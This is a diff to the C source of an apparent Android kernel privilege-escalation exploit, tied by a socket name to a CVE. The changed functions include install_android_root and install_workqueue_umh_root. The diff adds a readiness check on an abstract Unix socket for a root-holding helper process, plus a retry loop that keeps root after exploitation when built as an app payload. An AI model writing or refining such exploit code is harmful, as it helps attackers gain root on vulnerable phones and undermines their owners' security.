@@ -8,6 +8,7 @@ uint32_t root_uid_before = 0xffffffff;
 uint32_t root_uid_after = 0xffffffff;
 
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
+#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
 
 struct umh_subprocess_info {
   uint8_t work[48];
@@ -105,6 +106,24 @@ static int root_socket_ready(void) {
   sun.sun_family = AF_UNIX;
   snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
   int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
+  close(fd);
+  return ready;
+}
+
+static int root_hold_socket_ready(void) {
+  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) {
+    return 0;
+  }
+  struct sockaddr_un address;
+  memset(&address, 0, sizeof(address));
+  address.sun_family = AF_UNIX;
+  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
+         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
+  socklen_t address_length = (socklen_t)(
+      offsetof(struct sockaddr_un, sun_path) +
+      sizeof(ROOT_HOLD_READY_SOCKET));
+  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
   close(fd);
   return ready;
 }
@@ -283,5 +302,24 @@ static int install_workqueue_umh_root(int fd) {
 int install_android_root(int fd) {
   root_uid_before = getuid();
   pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
-  return install_workqueue_umh_root(fd);
+  int installed = install_workqueue_umh_root(fd);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  if (installed) {
+    int holder_ready = 0;
+    for (int attempt = 0; attempt < 200; attempt++) {
+      if (root_hold_socket_ready()) {
+        holder_ready = 1;
+        break;
+      }
+      usleep(10000);
+    }
+    pr_info("root p0 reference holder ready=%d\n", holder_ready);
+    if (!holder_ready) {
+      root_child_done = 0;
+      root_uid_after = root_uid_before;
+      return 0;
+    }
+  }
+#endif
+  return installed;
 }
